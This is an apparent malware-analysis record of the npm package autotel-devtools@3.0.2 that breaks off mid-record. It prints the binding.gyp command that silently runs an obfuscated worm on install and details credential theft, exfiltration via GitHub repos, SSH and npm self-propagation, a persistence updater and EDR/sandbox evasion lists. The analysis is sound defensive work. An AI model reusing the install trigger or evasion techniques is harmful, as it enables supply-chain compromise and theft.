# npm autotel-devtools@3.0.2

**Source:** datadog · **Source label:** malicious · **Released:** 2026-06-04 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-4-8)

## Summary

`autotel-devtools@3.0.2` carries no install hook script, but its `binding.gyp` (target `Setup`, type `none`) hides a GYP command expansion `<!(node index.js > /dev/null 2>&1 && echo stub.c)` in its `sources`, which node-gyp runs at configure time during the implicit `node-gyp rebuild`. So `index.js` executes on every install, with output discarded and all errors swallowed. `index.js` is a 4.1MB single-line loader behind five obfuscation layers (char-code array + Caesar shift eval, two AES-128-GCM stages, an obfuscator.io string table, and a bespoke pbkdf2/SHA256-CTR string cipher); it decrypts the Shai-Hulud "second coming" worm, writes it to `/tmp/p<random>.js`, and runs it under the present Bun or, failing that, a Bun runtime it downloads from GitHub. The worm steals host info, GitHub/npm/cloud credentials and SSH hosts, exfiltrates via attacker-created GitHub repos (api.github.com, with an api.anthropic.com fallback), poisons AI-assistant configs, and drops an RSA-signed Python updater. Its payload is guarded by seven recorded install-time gates: an anti-honeypot/sandbox check (`IX`), a Russian-locale exclusion (`z7`), a reinfection pidfile lock (`yX`), a CPU/EDR (path and process list)/CI anti-sandbox check on the dropped Python updater and its persistence (`i1`), an ssh-present plus known-hosts check on SSH self-propagation (`a1`), a token and OS check on npm self-propagation (`handleNpmTokens`, `g1.execute`), and a GitHub-Actions workflow match on the OIDC republish (`bK`).

## Execution

- **node_gyp_implicit** `node index.js > /dev/null 2>&1 && echo stub.c`: 2-file chain; native_build, direct_script, decoded_eval, download_then_exec, detached_child; errors hidden.

## Gates

| gate | hook | expression | branch | min | behaviours | recipe |
|---|---|---|---|---|---|---|
| g1 | node_gyp_implicit | c1 && c2 && c3 && c4 (c1: process.env[GITHUB_TOKEN\|NPM_TOKEN\|ANTHROPIC_API_KEY\|CIRCLE_TOKEN\|AWS_ACCESS_KEY_ID] not_startswith [ghp_decoyGitHubToken, npm_F4k3NPMToken, sk-ant-api03-fake, fake_circle, AKIAFAKE]; c2: process.env.GITHUB_REPOSITORY != actions-security-demo/compromised-packages; c3: home_or_path not_startswith /tmp/npm-safe/; c4: target_artifact not_includes FAKE) | then | 4 | recon, cred_read, exfil, self_propagation, persistence | env_var_absent=GITHUB_TOKEN, NPM_TOKEN, ANTHROPIC_API_KEY, CIRCLE_TOKEN, AWS_ACCESS_KEY_ID, GITHUB_REPOSITORY; file_absent=~/.aws/credentials |
| g2 | node_gyp_implicit | c5 && c6 && c16 (c5: locale_language not_startswith ru; c6: locale_language not_startswith ru; c16: locale_language not_startswith ru) | then | 3 | recon, cred_read, exfil, self_propagation, persistence | locale=en-US; env_var=LANG=en_US.UTF-8 |
| g3 | node_gyp_implicit | c7 \|\| c15 (c7: file_or_dir_exists not_exists <tmpdir>/tmp.0144018410.lock; c15: process_list not_exists) | then | 1 | recon, cred_read, exfil, self_propagation, persistence | file_absent=/tmp/tmp.0144018410.lock |
| g4 | node_gyp_implicit | c1 && c2 && c3 && c4 && c5 && c6 && c16 && (c7 \|\| c15) && c8 && c9 && c10 && c11 (c1: process.env[GITHUB_TOKEN\|NPM_TOKEN\|ANTHROPIC_API_KEY\|CIRCLE_TOKEN\|AWS_ACCESS_KEY_ID] not_startswith [ghp_decoyGitHubToken, npm_F4k3NPMToken, sk-ant-api03-fake, fake_circle, AKIAFAKE]; c2: process.env.GITHUB_REPOSITORY != actions-security-demo/compromised-packages; c3: home_or_path not_startswith /tmp/npm-safe/; c4: target_artifact not_includes FAKE; c5: locale_language not_startswith ru; c6: locale_language not_startswith ru; c16: locale_language not_startswith ru; c7: file_or_dir_exists not_exists <tmpdir>/tmp.0144018410.lock; c15: process_list not_exists; c8: hardware >= 4; c9: vm_sandbox_artifact not_exists [/opt/CrowdStrike, /Library/CS/falcon, /opt/carbonblack, /opt/sentinelone, C:\Program Files\CrowdStrike, C:\Program Files\SentinelOne, C:\Program Files\CarbonBlack]; c10: process.env.CI falsy; c11: process_list not_includes [falcon-sensor, falcond, csfalcon, sentinelone, sentinelagent, mdatp, wdavdaemon, cbagent, cbdaemon, cylance, crowdstrike, trendmicro, ds_agent, xagt, osquery, tanium, qualys]) | then | 12 | write_file, spawn_process, download, persistence | cpu_count=4; file_absent=/opt/CrowdStrike, /Library/CS/falcon, /opt/carbonblack, /opt/sentinelone; env_var_absent=CI, GITHUB_ACTIONS, GITLAB_CI, TRAVIS, CIRCLECI, JENKINS_URL, BUILD_BUILDURI, CODEBUILD_BUILD_ID, BUILDKITE, APPVEYOR, BITBUCKET_BUILD_NUMBER, DRONE, SEMAPHORE, TEAMCITY_VERSION, bamboo_agentId, BITRISE_IO, CIRRUS_CI, CF_BUILD_ID, CI_NAME, NETLIFY, VERCEL, NOW_GITHUB_DEPLOYMENT, WERCKER_MAIN_PIPELINE_STARTED, BUDDY_WORKSPACE_ID, SHIPPABLE, JB_SPACE_EXECUTION_NUMBER, SAILCI, VELA, SCREWDRIVER, CF_PAGES, DISTELLI_APPNAME |
| g5 | node_gyp_implicit | c1 && c2 && c3 && c4 && c5 && c6 && c16 && (c7 \|\| c15) && c12 && (c13 \|\| c14) (c1: process.env[GITHUB_TOKEN\|NPM_TOKEN\|ANTHROPIC_API_KEY\|CIRCLE_TOKEN\|AWS_ACCESS_KEY_ID] not_startswith [ghp_decoyGitHubToken, npm_F4k3NPMToken, sk-ant-api03-fake, fake_circle, AKIAFAKE]; c2: process.env.GITHUB_REPOSITORY != actions-security-demo/compromised-packages; c3: home_or_path not_startswith /tmp/npm-safe/; c4: target_artifact not_includes FAKE; c5: locale_language not_startswith ru; c6: locale_language not_startswith ru; c16: locale_language not_startswith ru; c7: file_or_dir_exists not_exists <tmpdir>/tmp.0144018410.lock; c15: process_list not_exists; c12: installed_tool exists; c13: target_artifact exists; c14: target_artifact exists) | then | 10 | self_propagation | installed_tool=ssh; file_present=~/.ssh/known_hosts |
| g6 | node_gyp_implicit | c1 && c2 && c3 && c4 && c5 && c6 && c16 && (c7 \|\| c15) && c19 && c18 && c17 (c1: process.env[GITHUB_TOKEN\|NPM_TOKEN\|ANTHROPIC_API_KEY\|CIRCLE_TOKEN\|AWS_ACCESS_KEY_ID] not_startswith [ghp_decoyGitHubToken, npm_F4k3NPMToken, sk-ant-api03-fake, fake_circle, AKIAFAKE]; c2: process.env.GITHUB_REPOSITORY != actions-security-demo/compromised-packages; c3: home_or_path not_startswith /tmp/npm-safe/; c4: target_artifact not_includes FAKE; c5: locale_language not_startswith ru; c6: locale_language not_startswith ru; c16: locale_language not_startswith ru; c7: file_or_dir_exists not_exists <tmpdir>/tmp.0144018410.lock; c15: process_list not_exists; c19: target_artifact regex npm_[A-Za-z0-9]{36,}; c18: server_response truthy; c17: os in [darwin, linux]) | then | 11 | self_propagation | os=linux; file_present=~/.npmrc; network=registry[.]npmjs[.]org:443=reachable |
| g7 | node_gyp_implicit | c1 && c2 && c3 && c4 && (c20 \|\| c21) && c22 && (c23 \|\| c24) && (c25 \|\| c26) && c28 && c27 (c1: process.env[GITHUB_TOKEN\|NPM_TOKEN\|ANTHROPIC_API_KEY\|CIRCLE_TOKEN\|AWS_ACCESS_KEY_ID] not_startswith [ghp_decoyGitHubToken, npm_F4k3NPMToken, sk-ant-api03-fake, fake_circle, AKIAFAKE]; c2: process.env.GITHUB_REPOSITORY != actions-security-demo/compromised-packages; c3: home_or_path not_startswith /tmp/npm-safe/; c4: target_artifact not_includes FAKE; c20: process.env.WORKFLOW_ID truthy; c21: process.env.REPO_ID_SUFFIX truthy; c22: process.env.GITHUB_ACTIONS truthy; c23: process.env.WORKFLOW_ID falsy; c24: process.env.GITHUB_WORKFLOW_REF includes <value of env WORKFLOW_ID>; c25: process.env.REPO_ID_SUFFIX falsy; c26: process.env.GITHUB_REPOSITORY includes <value of env REPO_ID_SUFFIX>; c28: server_response truthy; c27: process.env.OIDC_PACKAGES truthy) | then | 10 | self_propagation | env_var=GITHUB_ACTIONS=true, WORKFLOW_ID=w, GITHUB_WORKFLOW_REF=w, OIDC_PACKAGES=p; env_var_absent=REPO_ID_SUFFIX; network=registry[.]npmjs[.]org:443=reachable |

Gate intent: g1 evade/enables/anti_analysis; g2 evade/enables/targeting; g3 activate/enables/unclear; g4 evade/enables/anti_analysis; g5 activate/enables/data_availability; g6 activate/enables/data_availability; g7 activate/enables/targeting

Grounding: 0 of 28 conditions and 0 of 7 gates from the candidate set; out of set, pending verification: c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16, c17, c18, c19, c20, c21, c22, c23, c24, c25, c26, c27, c28, g1, g2, g3, g4, g5, g6, g7.

## Requirements

- network: github[.]com:443, api[.]github[.]com:443, api[.]anthropic[.]com:443, registry[.]npmjs[.]org:443 (Downloads the Bun runtime from github.com, exfiltrates stolen data to the GitHub API (attacker-created repos), with api.anthropic.com as a fallback sender host, and validates tokens and republishes packages through the npm registry. Without these the payload cannot complete.)
- installed_tool: curl, unzip, bash, python3 (getBunPath downloads and unpacks the Bun runtime with curl and unzip; the i1 updater is launched via bash, and its n7 installer exits unless python3 is present.)

## Behaviour

- Ungated: write_file, download, exec_downloaded
- Gated: recon, cred_read, exfil, self_propagation, persistence, write_file, spawn_process, download

## Notes

- Every gate and condition is out of the deterministic candidate set: the extractor only saw the outer `eval(...)` in `index.js`, so all gates were added by hand after decoding. All five decode layers are registered as `decode_spec` derivations (d7-d11, plus d12 for the dropped updater) and replay from the package alone; anchors point into d11 (the fully env-decoded payload).
- The `typeof Bun` branch and the `H9()/$X()` daemonize-and-detach are plumbing/re-entry, not gates: both Bun branches run the same payload, and the detached child continues the same run (env `__IS_DAEMON=1`).
- Repair round 1 added g5 for `a1` SSH self-propagation (`which ssh`, then hosts from `~/.ssh/known_hosts` or `~/.ssh/config`), added the `ps aux` EDR process check (c11) to the `i1` gate, and read the g4 recipe values from the code.
- Repair round 2 added g6 (npm self-propagation: token pattern match, registry validation in `E7`, darwin or linux) and g7 (`bK` OIDC republish, which fires only when `WORKFLOW_ID`/`REPO_ID_SUFFIX` match the GitHub workflow and repo, a no-op on a normal registry install). It also confirmed the `PX` reading behind g5 in the code.
- Not encoded as gates: the rubygems route (`handleRubygemsTokens`) has its own darwin/linux test and is flagged for review; `l1` writes bun-bootstrap commands into AI-assistant settings.json files (ungated persistence).
- Verification repair: the `z7` gate gained c16 (the `SystemRoot` locale test) and the `yX` gate is now `c7 || c15`, since a lock whose pid is not live is deleted and the run continues. g1 to g3 now cite recon, exfil, self-propagation and persistence sinks, and g4's region now includes the `try` block that holds its write and spawn.
- `fL` runs `PX` after its try/catch, and the catch fills the module list with `t1()`, so `l1`, `i1` and `a1` still run if `uX` throws (cwd gone, or a lock read failure). A throw is not a deliberate test, so it is in no gate expression. It is flagged for a reviewer.
- `value_recovered` is `decoded` for the IX conditions (honeytoken prefixes, decoy repo, cwd, decoy AWS creds) because those strings came out of the `f489094fb` cipher (derivation d11); the `z7`, `i1` and CI values were plaintext in the decoded bundle.
- The dropped `updater.py` (var d7, derivation d12) pip-installs `requests` and `cryptography`, then polls GitHub commit search hourly for `firedalazer <b64 url>.<b64 sig>` messages, checks an RSA-PSS signature with its embedded key, and downloads and runs the signed URL with python3. The `n7` bash installer copies it to `~/.local/share/updater/update.py` and registers a systemd user service (Linux) or LaunchAgent (macOS).

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "autotel-devtools",
    "version": "3.0.2",
    "archive_sha256": "839080c228cd97adb5076d825327cacc06e511e004a31752bd9c227b8efffd8d",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2026-06-04",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/compromised_lib/2026-06-04-autotel-devtools-v3.0.2.zip",
    "package_root": "layer0/tmp/tmp2m0p9vze/autotel-devtools/package",
    "cluster_key": "5ecfd7d0cbcdf835d892a1095958dd1792f6b7fb4b562d7ce21d8c417b40934f",
    "analysis_type": "ai",
    "model_name": "claude-opus-4-8"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "node_gyp_implicit",
        "command": "node index.js > /dev/null 2>&1 && echo stub.c",
        "runs_on": "always",
        "file_chain": [
          "binding.gyp",
          "index.js"
        ],
        "interpreter": "node",
        "launch_style": [
          "native_build",
          "direct_script",
          "decoded_eval",
          "download_then_exec",
          "detached_child"
        ],
        "silent_failure": true
      }
    ],
    "delays": [],
    "notes": [
      "No install hook in package.json; binding.gyp (target Setup, type none) hides a GYP command expansion `<!(node index.js > /dev/null 2>&1 && echo stub.c)` in sources, which node-gyp runs at configure time during the implicit `node-gyp rebuild`. So index.js runs on every install; output is discarded.",
      "index.js (4.1MB, one line) decoded as data via 5 registered layers: d7 char-code+Caesar n=2 eval; d9 AES-128-GCM stage _p; d10 obfuscator.io string table; d11 pbkdf2+SHA256-CTR string cipher (fn f489094fb). Worm code read in full; bundled esbuild libs audited by sink inventory.",
      "Loader (d7) decrypts stage _p (worm, d9/d10/d11), writes it to /tmp/p<random>.js and runs it. `if(typeof Bun!==undefined)` uses the present Bun, else evals stage _b (getBunPath) to download Bun v1.3.13 from github.com/oven-sh/bun and run the payload with it. Runtime-selection plumbing, not a gate.",
      "Payload entry fL() runs uX() first (the install-time gates), then collects host/token/cloud secrets (_3, h3), exfiltrates via attacker-created GitHub repos (i3 senders -> api.github.com) or an api.anthropic.com fallback sender, then dispatches modules via PX().",
      "Daemonize/re-entry (not a gate): uX does `if(!H9() && $X()) process.exit(0)`. H9() is true in CI. $X() spawns a detached copy with env __IS_DAEMON=1 (stdio ignore, unref) and the parent exits; the child continues. H9 only picks inline (CI) vs detached; both run the payload.",
      "g5: PX calls each module's shouldExecute and then execute; a1.shouldExecute is `which ssh`. The PX guard reaches c12 through that dynamic dispatch (t1/xX build the module list). a1 hosts come from ~/.ssh/known_hosts (IPv4 entries skipped) or ~/.ssh/config Host lines.",
      "l1 writes bun-bootstrap commands into AI-assistant settings.json files under ~/.config (ungated persistence, not a gate).",
      "g7: bK() runs X6 (npm OIDC republish) then exits when WORKFLOW_ID/REPO_ID_SUFFIX are set and match the GitHub workflow/repo. The worm's injected workflows set those vars, so this path is a no-op on a normal registry install, but a VM can set them, so it is a gate.",
      "bK's other exit: REPO_ID_SUFFIX set and matching with WORKFLOW_ID not matching exits with no payload, inside GITHUB_ACTIONS only. Not put in g1 to g3: it is the false side of g7's test and cannot be written positively.",
      "Secondary payload: i1 writes Python updater.py (var d7, AES-256-GCM+gzip, decoded in d12) to /tmp/update-*/updater.py and runs `bash -s -- updater.py` with var n7 on stdin.",
      "d12 n7 (bash): requires uname Linux or Darwin and python3, copies updater to ~/.local/share/updater/update.py, installs a systemd user service update-monitor (Linux, plus loginctl enable-linger) or a LaunchAgent (Darwin). Hence persistence on g4.",
      "d12 updater.py: pip-installs requests/cryptography, then hourly searches api.github.com/search/commits for `firedalazer <b64 url>.<b64 sig>`, verifies an RSA-PSS signature and downloads and runs that URL with python3. Signed-command C2 after install; its checks are server_response.",
      "The OS check inside n7 picks systemd vs launchd persistence; it lives in a bash string handed to stdin, so it is noted here rather than encoded as a JS gate.",
      "z7 has a third test (c16): when SystemRoot is set it reads LANG first, then LANGUAGE, then LC_ALL, so LANG=ru with LC_ALL=en passes c6 and still exits. With SystemRoot unset the tested value is empty and c16 holds.",
      "yX accepts an existing lock when process.kill(pid, 0) throws, then deletes it and writes its own pid. So the lock gate is c7 || c15: lock absent, or the pid in it is not a live process.",
      "fL error fallback: PX sits after the try/catch, and the catch sets the module list to t1() (l1, i1, a1). A throw from uX therefore still runs those modules, with no exit guard having fired.",
      "Throw routes out of uX: process.cwd() in IX if the cwd is gone (skips c3, c4, c5, c6, c16, c7, c15), and a lock read failure in yX (skips c7, c15). A throw is not a deliberate test, so it is noted here and not put in any expression.",
      "g1 to g3 persistence and the l1/i1/a1 modules run through PX after the try block, so those payloads stop at t1 and are marked dynamic_dispatch. Exfil is marked the same because the sender is picked at run time from the i3 list.",
      "g6: npm self-propagation (u1.ingest, handleNpmTokens, g1.execute) needs a collected string matching the npm token pattern, registry validation in E7 (response ok, token listed with bypass_2fa, package write) and process.platform darwin or linux. c18 merges the three E7 tests.",
      "g1 to g3 keep self_propagation as the union behind their guards; g5, g6 and g7 give the narrower conditions of the SSH, npm and OIDC routes. The rubygems route (handleRubygemsTokens) has its own darwin/linux test and is not encoded.",
      "PX reading for g5, checked in code: PX maps the module list and runs `if(await m.shouldExecute()) await m.execute()` in a swallowed try. xX appends t1() and the fL catch uses t1(), and t1 returns l1, i1 and a1, so a1 always reaches that test."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": [
        "github[.]com:443",
        "api[.]github[.]com:443",
        "api[.]anthropic[.]com:443",
        "registry[.]npmjs[.]org:443"
      ],
      "reason": "Downloads the Bun runtime from github.com, exfiltrates stolen data to the GitHub API (attacker-created repos), with api.anthropic.com as a fallback sender host, and validates tokens and republishes packages through the npm registry. Without these the payload cannot complete."
    },
    {
      "axis": "installed_tool",
      "value": [
        "curl",
        "unzip",
        "bash",
        "python3"
      ],
      "reason": "getBunPath downloads and unpacks the Bun runtime with curl and unzip; the i1 updater is launched via bash, and its n7 installer exits unless python3 is present."
    }
  ],
  "conditions": [
    {
      "id": "c1",
      "category": "env_var",
      "api": "process.env[GITHUB_TOKEN|NPM_TOKEN|ANTHROPIC_API_KEY|CIRCLE_TOKEN|AWS_ACCESS_KEY_ID]",
      "operator": "not_startswith",
      "value": [
        "ghp_decoyGitHubToken",
        "npm_F4k3NPMToken",
        "sk-ant-api03-fake",
        "fake_circle",
        "AKIAFAKE"
      ],
      "value_recovered": "decoded",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 336532,
            "end_byte": 336588,
            "node_type": "binary_expression",
            "sha256": "8b7a9c969330273d",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c2",
      "category": "env_var",
      "api": "process.env.GITHUB_REPOSITORY",
      "operator": "!=",
      "value": "actions-security-demo/compromised-packages",
      "value_recovered": "decoded",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 336664,
            "end_byte": 336708,
            "node_type": "call_expression",
            "sha256": "f38d816bd53db039",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c3",
      "category": "home_or_path",
      "api": "process.cwd",
      "operator": "not_startswith",
      "value": "/tmp/npm-safe/",
      "value_recovered": "decoded",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 336723,
            "end_byte": 336771,
            "node_type": "call_expression",
            "sha256": "42883fa19751ffed",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c4",
      "category": "target_artifact",
      "api": "fs.readFileSync",
      "operator": "not_includes",
      "value": "FAKE",
      "value_recovered": "decoded",
      "probe": {
        "kind": "file",
        "callee": "fs.readFileSync",
        "target": "~/.aws/credentials",
        "accessor": "content"
      },
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 336873,
            "end_byte": 336921,
            "node_type": "call_expression",
            "sha256": "2f7ba27e1b8b6d40",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c5",
      "category": "locale_language",
      "api": "Intl.DateTimeFormat",
      "operator": "not_startswith",
      "value": "ru",
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 178085,
            "end_byte": 178183,
            "node_type": "call_expression",
            "sha256": "5222649a5abae458",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c6",
      "category": "locale_language",
      "api": "process.env.LANG",
      "operator": "not_startswith",
      "value": "ru",
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 178206,
            "end_byte": 178344,
            "node_type": "call_expression",
            "sha256": "47e991af608aed87",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c7",
      "category": "file_or_dir_exists",
      "api": "fs.existsSync",
      "operator": "not_exists",
      "value": "<tmpdir>/tmp.0144018410.lock",
      "value_recovered": "plain",
      "probe": {
        "kind": "file",
        "callee": "fs.existsSync",
        "target": "<tmpdir>/tmp.0144018410.lock",
        "accessor": "exists"
      },
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 337990,
            "end_byte": 338003,
            "node_type": "call_expression",
            "sha256": "7b9d8fe4d3732eb5",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c8",
      "category": "hardware",
      "api": "os.cpus",
      "operator": ">=",
      "value": 4,
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 288504,
            "end_byte": 288528,
            "node_type": "binary_expression",
            "sha256": "86f8bbfb8a68b73e",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c9",
      "category": "vm_sandbox_artifact",
      "api": "fs.existsSync",
      "operator": "not_exists",
      "value": [
        "/opt/CrowdStrike",
        "/Library/CS/falcon",
        "/opt/carbonblack",
        "/opt/sentinelone",
        "C:\\Program Files\\CrowdStrike",
        "C:\\Program Files\\SentinelOne",
        "C:\\Program Files\\CarbonBlack"
      ],
      "value_recovered": "plain",
      "probe": {
        "kind": "file",
        "callee": "fs.existsSync",
        "target": "/opt/CrowdStrike (+ other EDR paths)",
        "accessor": "exists"
      },
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 180906,
            "end_byte": 180941,
            "node_type": "if_statement",
            "sha256": "ad306da89eefa980",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c10",
      "category": "ci_marker",
      "api": "process.env.CI",
      "operator": "falsy",
      "value": null,
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 178966,
            "end_byte": 179017,
            "node_type": "binary_expression",
            "sha256": "fd2a75bb878ed922",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c11",
      "category": "process_list",
      "api": "child_process.execSync",
      "operator": "not_includes",
      "value": [
        "falcon-sensor",
        "falcond",
        "csfalcon",
        "sentinelone",
        "sentinelagent",
        "mdatp",
        "wdavdaemon",
        "cbagent",
        "cbdaemon",
        "cylance",
        "crowdstrike",
        "trendmicro",
        "ds_agent",
        "xagt",
        "osquery",
        "tanium",
        "qualys"
      ],
      "value_recovered": "plain",
      "probe": {
        "kind": "exec",
        "callee": "child_process.execSync",
        "target": "ps aux 2>/dev/null",
        "accessor": "stdout"
      },
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 181157,
            "end_byte": 181204,
            "node_type": "if_statement",
            "sha256": "ee9369354bccb665",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c12",
      "category": "installed_tool",
      "api": "Bun.spawnSync",
      "operator": "exists",
      "value": null,
      "value_recovered": "plain",
      "probe": {
        "kind": "exec",
        "callee": "Bun.spawnSync",
        "target": "which ssh",
        "accessor": "returncode"
      },
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 310075,
            "end_byte": 310137,
            "node_type": "binary_expression",
            "sha256": "042b6988ff3682c1",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c13",
      "category": "target_artifact",
      "api": "fs/promises.readFile",
      "operator": "exists",
      "value": null,
      "value_recovered": "plain",
      "probe": {
        "kind": "file",
        "callee": "fs/promises.readFile",
        "target": "~/.ssh/known_hosts",
        "accessor": "content"
      },
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 311531,
            "end_byte": 311599,
            "node_type": "call_expression",
            "sha256": "ab882308493b78f6",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c14",
      "category": "target_artifact",
      "api": "fs/promises.readFile",
      "operator": "exists",
      "value": null,
      "value_recovered": "plain",
      "probe": {
        "kind": "file",
        "callee": "fs/promises.readFile",
        "target": "~/.ssh/config",
        "accessor": "content"
      },
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 312027,
            "end_byte": 312090,
            "node_type": "call_expression",
            "sha256": "6452ebc4c1e45993",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c15",
      "category": "process_list",
      "api": "process.kill",
      "operator": "not_exists",
      "value": null,
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 337863,
            "end_byte": 337893,
            "node_type": "call_expression",
            "sha256": "e2c54388022987bb",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c16",
      "category": "locale_language",
      "api": "process.env.LANG",
      "operator": "not_startswith",
      "value": "ru",
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 178359,
            "end_byte": 178498,
            "node_type": "call_expression",
            "sha256": "3c94fd068061623d",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c17",
      "category": "os",
      "api": "process.platform",
      "operator": "in",
      "value": [
        "darwin",
        "linux"
      ],
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 188974,
            "end_byte": 189025,
            "node_type": "call_expression",
            "sha256": "fdc7b1cea49ae691",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c18",
      "category": "server_response",
      "api": "fetch",
      "operator": "truthy",
      "value": null,
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 191599,
            "end_byte": 191676,
            "node_type": "if_statement",
            "sha256": "4716aeaca4d3763f",
            "line": 1
          }
        },
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 192028,
            "end_byte": 192099,
            "node_type": "if_statement",
            "sha256": "037b9c5a9beba278",
            "line": 1
          }
        },
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 192099,
            "end_byte": 192265,
            "node_type": "if_statement",
            "sha256": "128b3c8784ea48f5",
            "line": 1
          }
        }
      ],
      "in_scope": false,
      "provenance": "out_of_set"
    },
    {
      "id": "c19",
      "category": "target_artifact",
      "api": "E.DEFAULT_PATTERNS.npmtoken",
      "operator": "regex",
      "value": "npm_[A-Za-z0-9]{36,}",
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 208759,
            "end_byte": 208793,
            "node_type": "subscript_expression",
            "sha256": "fff5d555b9e24685",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c20",
      "category": "env_var",
      "api": "process.env.WORKFLOW_ID",
      "operator": "truthy",
      "value": null,
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338384,
            "end_byte": 338394,
            "node_type": "unary_expression",
            "sha256": "4441e10f159518d2",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c21",
      "category": "env_var",
      "api": "process.env.REPO_ID_SUFFIX",
      "operator": "truthy",
      "value": null,
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338396,
            "end_byte": 338406,
            "node_type": "unary_expression",
            "sha256": "eb7ea3a30f13c6c7",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c22",
      "category": "ci_marker",
      "api": "process.env.GITHUB_ACTIONS",
      "operator": "truthy",
      "value": null,
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338421,
            "end_byte": 338450,
            "node_type": "subscript_expression",
            "sha256": "f7c694e204eaed8a",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c23",
      "category": "env_var",
      "api": "process.env.WORKFLOW_ID",
      "operator": "falsy",
      "value": null,
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338532,
            "end_byte": 338542,
            "node_type": "unary_expression",
            "sha256": "4441e10f159518d2",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c24",
      "category": "env_var",
